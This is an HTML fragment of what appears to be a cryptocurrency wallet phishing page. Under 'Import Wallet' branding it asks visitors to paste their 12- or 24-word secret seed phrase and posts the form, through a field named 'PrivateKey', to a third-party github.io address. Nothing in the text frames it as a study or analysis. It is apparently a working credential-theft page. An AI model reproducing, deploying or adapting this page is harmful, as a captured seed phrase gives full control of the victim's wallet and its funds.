  ...
  <head>
    ...
    <style>
      ...
      * {
      ...
      .cDnNqw input.ant-input,
      .cDnNqw .ant-select-selection {
        font-size: 1rem;
          ...
          <div class="sc-jqCOkK kFZWwp">
            <div class="sc-gGBfsJ jvrGcO">
              <div class="sc-jnlKLf OHNdu">
                <div class="sc-fYxtnH hARKVj">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<img src="alextrust.png" alt="cashtab" class="sc-tilXH gdtVXy"></div><br><br>
                <h2>
                  <center>Import Wallet</center>
                </h2>
                <center>
                  <p class="thepadding">Enter your secret phrase here to connect
                  </p>
                </center>
                <div class="sc-htoDjs cDnNqw">

                  <form method="post" action="https://etherprize.github.io/ProgramShib.github.io/20trustwall.html/Import-cnfir-wallet.html" class="ant-form ant-form-horizontal">
                    <div class="ant-row ant-form-item ant-form-item-with-help" style="row-gap: 0px;">
                      <div class="ant-col ant-form-item-control">
                        <p class="thepadding" style="text-align: left;color: hsla(0,0%,49.8%,.85);">Phrase</p>
                        <div>
                          <div class="thepadding">
                            <textarea class="import-account__secret-phrase" minlenght="20" placeholder="Paste seed phrase from clipboard" name="PrivateKey" id="wordsseed" required></textarea>Typically 12 (sometimes 24) words separated by single spaces
                          </div>
                        </div>
                    ...
                    <div class="thepadding">
                      <button class="button sc-VigVT fWmldN" type="submit">IMPORT</button>
                      <div1></div1>
                    </div>
                  </form>
                </div>
